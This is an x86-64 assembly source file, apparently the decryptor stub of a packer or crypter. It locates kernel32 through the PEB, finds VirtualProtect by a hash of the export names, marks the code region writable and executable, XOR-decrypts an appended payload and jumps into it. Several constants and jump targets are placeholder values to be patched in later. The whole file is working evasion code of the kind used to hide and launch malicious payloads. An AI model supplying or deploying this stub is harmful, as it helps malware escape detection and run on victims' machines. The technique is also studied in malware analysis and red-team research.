BITS 64

    call 0x5
    pop rdx
    sub rdx,byte +0x6
    push rdx
    mov rbx,[gs:0x60]           ; Get PEB
    mov rbx,[rbx+0x18]          ; PEB loader data
    mov rbx,[rbx+0x10]          ; load order module list
    mov rbx,[rbx]               ; first - ignore it
    mov rbx,[rbx]               ; second - that's our baby
    mov rax,[rbx+0x30]          ; DllBase of _LDR_DATA_TABLE_ENTRY
    push rax
    mov eax,[rax+0x3c]          ; Start of NT header
    add rax,[rsp]
    mov eax,[rax+0x88]          ; Export Directory RVA
    add rax,[rsp]
    mov ebx,[rax+0x20]          ; Pointer to start of function names array
    add rbx,[rsp]
    mov ecx,[rax+0x1c]          ; Addresses pointer
    add rcx,[rsp]
    mov edx,[rax+0x24]          ; Ordinal pointer
    add rdx,[rsp]
    push rcx                    ; Push address array pointer to stack, we'll come back for it
    
GetFunctionLoop: 
    mov esi, [rbx]              ; Move offset of pointer to function name into esi
    add rsi, [rsp+0x8]          ; And add the DLL base
    push rdx                    ; Ordinal, keep it for later
    push rsi                    ; Push name to the stack for the Hash function
    call 0x99999999             ; ---- Hash
    pop rdx                     ; Reclaim ordinal
    cmp eax, 0x38d13c           ; Hash of VirtualProtect
    jz 0xaaaaaaaa               ; ---- GetFunctionOut
    add ebx,byte +0x4           ; Advance to next function name
    add edx,byte +0x2           ; And the next ordinal
    jmp 0xbbbbbbbb              ; ---- GetFunctionLoop
GetFunctionOut: 
    pop rcx                     ; Reclaim address pointer array
    xor ebx, ebx
    mov bx, [edx]
    imul ebx, ebx, byte +0x4
    pop rax                     ; Fetch kernel32 base address from top of stack
    add eax, [ecx + ebx]        ; RVA of the function
    mov rcx, [rsp]              ; Pop end of original code into RDX
    mov edx, 0x11111111         ; Original code size
    sub rcx, rdx                ; And subtract it from rcx so it pointer at the beginning
    push rcx                    ; Keep it for later, need that to decrypt
    mov r8, 0x40                ; New protection value
    sub rsp, 8                  ; allocation space for old value
    mov r9, rsp                 ; Pointer to space for the old value
    call rax                    ; Call VIRTUALPROTECT
    add rsp, 8                  ; Clean up stack
    
    pop rcx                     ; Code start point
    pop rdx                     ; Code end point

; Actually start decrypting stuff
    mov rax, rcx
    add rax, 0x22222222
loop: 
    xor dword [rcx], 0x33333333
    cmp rcx, rdx
    jge 0xcccccccc        ; out
    add rcx, byte +0x4
    jmp 0xdddddddd        ; loop
out: 
    jmp rax
    
Hash: 
    mov rcx, rsi
    xor eax, eax
    xor edx, edx
HashLoop: 
    cmp byte [rcx], 0x0
    jz 0xeeeeeeee         ; HashOut
    mov dl, [rcx]
    or dl, 0x60
    add eax, edx
    shl eax, 1
    add ecx, byte +0x1
    jmp 0xffffffff        ; HashLoop
HashOut: 
    ret 0x8
    